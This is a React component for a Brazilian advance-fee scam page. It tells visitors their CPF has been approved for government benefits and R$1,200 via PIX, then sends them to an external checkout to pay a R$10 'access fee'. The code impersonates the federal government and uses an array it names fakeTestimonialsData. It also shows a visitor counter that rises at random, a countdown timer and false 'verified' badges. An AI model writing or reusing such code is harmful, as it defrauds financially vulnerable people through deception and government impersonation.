
"use client";

import type React from 'react';
import { useState, useEffect, FC, useRef } from 'react';
import Image from 'next/image';
import { Button } from '@/components/ui/button';
import { CheckCircle, TrendingUp, Users, AlertTriangle, ShieldCheck } from 'lucide-react';
import OfferTimer from '@/components/features/OfferTimer';

interface OfferStepProps {
  cpf: string | null;
}

interface Testimonial {
  name: string;
  location: string;
  text: string;
  photoUrl?: string;
  dataAiHint?: string;
}

const fakeTestimonialsData: Testimonial[] = [
   {
    name: "MARIA S.",
    location: "Fortaleza/CE",
    text: "Paguei a taxa com o <strong>CU NA MÃO</strong>, mas para minha surpresa... <strong>CAIU NA HORA!</strong> R$1.200,00 limpos na conta! Essa grana <strong>SALVOU MEU MÊS E MINHA VIDA!</strong> Simplesmente <strong>FODAA!</strong>",
    photoUrl: "https://i.imgur.com/TXZQbQo.png",
    dataAiHint: "person avatar"
  },
  {
    name: "J. COSTA",
    location: "Interior de MG",
    text: "No começo, achei que era <strong>ENGANAÇÃO TOTAL</strong>, mas arrisquei a taxa. Qual não foi minha surpresa quando vi o PIX de <strong>R$1.200,00 CAIR NA CONTA em MINUTOS!</strong> Dinheiro extra que <strong>ME TIROU DO SUFOCO!</strong> Recomendo DEMAIS!",
    photoUrl: "https://i.imgur.com/dpip9hc.png",
    dataAiHint: "person avatar"
  },
  {
    name: "ANA P.",
    location: "Salvador/BA",
    text: "Confesso que tremi na base pra pagar a taxa, achei que ia <strong>PERDER MEU DINHEIRINHO SUADO</strong>. Mas a necessidade falou mais alto. E não é que o negócio <strong>FUNCIONA MESMO?!</strong> R$1.200,00 liberados rapidinho! <strong>MELHOR INVESTIMENTO</strong> que fiz esse ano!",
    photoUrl: "https://i.imgur.com/FdL8RWB.jpeg",
    dataAiHint: "person avatar"
  },
];

const benefitsFromUserCode = [
    {
        nome: "Programa Auxílio Brasil",
        valor: "R$ 1200/mês",
        icon: "💰",
        descricao: "Benefício mensal direto na sua conta!",
    },
    {
        nome: "Tarifa Social de Energia",
        valor: "Até 65% de desconto",
        icon: "⚡",
        descricao: "Redução significativa na sua conta de luz!",
    },
    {
        nome: "Vale-Gás Federal",
        valor: "R$ 120 mensal",
        icon: "🔥",
        descricao: "Auxílio para comprar seu gás sem aperto!",
    },
    {
        nome: "Dinheiro Perdido",
        valor: "R$5000 por CPF",
        icon: "💸",
        descricao: "Valores esquecidos em contas e bancos!",
    },
     {
        nome: "Vale Estudante",
        valor: "R$ 1489/mês",
        icon: "🎓",
        descricao: "Apoio mensal para seus estudos!",
    },
];


const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
  const [peopleServed, setPeopleServed] = useState(2402);
  const [testimonials, setTestimonials] = useState<Testimonial[]>(fakeTestimonialsData);
  const taxSectionRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const interval = setInterval(() => {
      setPeopleServed(prev => prev + Math.floor(Math.random() * 5) + 1);
    }, 1500);

    const testimonialInterval = setInterval(() => {
       setTestimonials(prev => [...prev].sort(() => 0.5 - Math.random()));
    }, 8000);

    return () => {
      clearInterval(interval);
      clearInterval(testimonialInterval);
    };
  }, []);

  const handleLiberarAcessoClick = () => {
    window.location.href = "https://kingspay.site/checkout/taxa-de-saque-2025";
  };

  const handleEligibilityCheckClick = () => {
    taxSectionRef.current?.scrollIntoView({ behavior: 'smooth' });
  };

  const formattedCpf = cpf ? cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4") : '***.***.***-**';

  return (
    <div className="w-full max-w-4xl mx-auto p-4 md:p-6 space-y-8 bg-background text-foreground">

        <div className="text-center">
           <h2 className="font-headline text-xl md:text-2xl font-bold mb-2 text-foreground">
            Parabéns, seu CPF <span className="text-accent font-mono">{formattedCpf}</span> foi aprovado para receber o dinheiro e os benefícios a seguir!
          </h2>
        </div>

         <div className="bg-white rounded-xl shadow-xl p-6 md:p-8 mb-8 border-l-8 border-green-600 animate-scale-in">
            <h2 className="text-2xl md:text-3xl font-black text-gray-800 mb-6 text-center">Acesso LIBERADO para você:</h2>
            <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 md:gap-6 mb-8">
                {benefitsFromUserCode.map((beneficio, index) => (
                    <div key={index} className="bg-green-50 p-4 md:p-6 rounded-lg border border-green-200 shadow-md transform hover:scale-105 transition-all duration-200">
                        <div className="text-center">
                            <div className="text-3xl md:text-4xl mb-3 animate-pulse-slow">{beneficio.icon}</div>
                            <h3 className="font-bold text-gray-800 mb-2 text-base md:text-lg">{beneficio.nome}</h3>
                            <p className="text-green-700 font-black text-xl md:text-2xl mb-2">{beneficio.valor}</p>
                            <p className="text-xs md:text-sm text-gray-600">{beneficio.descricao}</p>
                            <CheckCircle className="text-green-500 mx-auto mt-3 animate-fade-in" size={24} />
                        </div>
                    </div>
                ))}
            </div>
        </div>

        <div className="text-center py-10 md:py-[50px] px-4 md:px-[20px] bg-[#0056b3] rounded-lg font-[Arial,sans-serif]">
          <h2 className="text-2xl md:text-[2.2em] text-white mb-4 md:mb-[20px] font-bold">
            Pronto para dar o Próximo Passo?
          </h2>
          <p className="text-base md:text-[1.2em] text-white max-w-[700px] mx-auto mb-6 md:mb-[30px]">
            Descubra se você se qualifica para os benefícios do Programa Jovem Cidadão Ativo e inicie sua jornada. Todo o processo é seguro, transparente e realizado via plataforma oficial do Governo Federal.
          </p>
          <Button
            onClick={handleEligibilityCheckClick}
            className="bg-[#ffc107] text-[#003366] py-3 px-4 text-base whitespace-normal md:py-4 md:px-10 md:text-xl font-bold border-none rounded-[10px] cursor-pointer transition-colors duration-300 ease-linear hover:bg-[#e0a800] no-underline h-auto"
          >
            Verificar Minha Elegibilidade Agora
          </Button>
          <p className="text-sm md:text-[0.9em] mt-4 md:mt-[20px] text-[rgba(255,255,255,0.8)]">
            Sua segurança e privacidade são prioridade.
          </p>
        </div>

        <div ref={taxSectionRef} id="taxSection" className="my-10 p-6 md:p-8 bg-primary text-primary-foreground rounded-xl shadow-2xl border-4 border-yellow-400 text-center relative overflow-hidden">
          <div className="absolute -top-4 -left-12 transform -rotate-45 bg-yellow-400 text-primary font-bold py-2 px-16 text-sm shadow-lg hidden sm:block">
            OFERTA ÚNICA
          </div>
          <AlertTriangle className="h-10 w-10 md:h-12 md:w-12 text-yellow-400 mx-auto mb-4" />
          <h3 className="font-headline text-xl md:text-3xl font-extrabold mb-2 uppercase">
            ÚNICA TAXA DE ACESSO!
          </h3>
          <p className="text-base md:text-lg mb-1 line-through opacity-70">DE <span className="font-bold">R$297,00</span></p>
          <div className="my-3">
            <span className="text-6xl md:text-8xl font-extrabold text-yellow-400 tracking-tighter">R$10</span>
            <span className="text-4xl md:text-6xl font-extrabold text-yellow-400">,00</span>
          </div>
          <p className="text-xs sm:text-sm md:text-base font-semibold bg-yellow-400 text-primary py-1 px-3 rounded-md inline-block mb-4 shadow-md">
            (VOCÊ ACABA DE ECONOMIZAR <span className="font-bold">R$287,00</span> HOJE!)
          </p>
          <p className="text-xs md:text-sm my-4 leading-relaxed max-w-md mx-auto px-2">
            <span className="font-bold uppercase text-yellow-300">IMPORTANTE:</span> Pague <span className="font-bold">SOMENTE AGORA</span> esta taxa para cobrir os custos de processamento <span className="font-bold">SEGURO</span> e liberação automática dos seus <span className="font-bold text-yellow-300">R$1.200,00</span> via PIX! SAQUE GARANTIDO IMEDIATAMENTE APÓS O PIX!
          </p>
          <Button
            onClick={handleLiberarAcessoClick}
            variant="default"
            size="lg"
            className="w-full max-w-md mx-auto h-14 text-lg md:h-16 md:text-xl font-bold bg-accent hover:bg-accent/90 text-accent-foreground shadow-xl mt-4 rounded-lg border-2 border-yellow-200"
          >
            Quero Receber o dinheiro!
          </Button>
          <p className="text-xs mt-4 text-primary-foreground/80 flex items-center justify-center">
            <ShieldCheck className="h-4 w-4 mr-1.5 text-green-300" /> Pagamento 100% SEGURO e Criptografado!
          </p>
           <div className="mt-4">
            <OfferTimer initialMinutes={2} initialSeconds={30} />
           </div>
        </div>

        <div>
           <h3 className="font-headline text-lg md:text-xl font-bold text-foreground text-center mb-5 uppercase flex items-center justify-center">
            <Users className="mr-2 h-6 w-6 md:h-7 md:w-7" />
            PESSOAS QUE SACARAM HOJE!
          </h3>
          <div className="space-y-4">
            {testimonials.map((testimonial, index) => (
              <div key={index} className="p-4 md:p-5 bg-card shadow-lg rounded-lg border border-border">
                  <div className="flex items-start">
                      {testimonial.photoUrl && (
                          <Image
                          src={testimonial.photoUrl}
                          alt={`Foto de ${testimonial.name}`}
                          width={56}
                          height={56}
                          data-ai-hint={testimonial.dataAiHint || "person avatar"}
                          className="rounded-full mr-3 md:mr-4 border-2 border-accent shadow-md"
                          />
                      )}
                      <div className="flex-1">
                          <p className="font-headline text-base md:text-lg font-semibold text-primary mb-1">🔥 SAQUE CONFIRMADO!</p>
                          <p className="text-sm md:text-base text-foreground italic leading-tight" dangerouslySetInnerHTML={{ __html: testimonial.text }} />
                          <p className="text-xs md:text-sm text-muted-foreground mt-2 font-bold">- {testimonial.name}, {testimonial.location}</p>
                          <p className="text-xs text-green-600 font-semibold mt-1">(VERIFICADO AGORA ✅)</p>
                      </div>
                  </div>
              </div>
            ))}
          </div>
          <div className="mt-10 text-center p-4 md:p-5 bg-primary text-primary-foreground rounded-lg shadow-xl border-2 border-yellow-300">
            <TrendingUp className="h-8 w-8 md:h-10 md:w-10 lg:h-12 lg:w-12 mx-auto mb-2 text-yellow-300 animate-pulse" />
            <p className="text-4xl md:text-5xl lg:text-6xl font-bold text-yellow-300">{peopleServed.toLocaleString('pt-BR')}</p>
            <p className="text-sm md:text-md lg:text-lg font-semibold uppercase">📈 BRASILEIROS JÁ SACARAM SÓ HOJE! <span className="text-yellow-300">NÃO FIQUE PRA TRÁS!</span></p>
          </div>
        </div>
    </div>
  );
};

export default OfferStep;
    
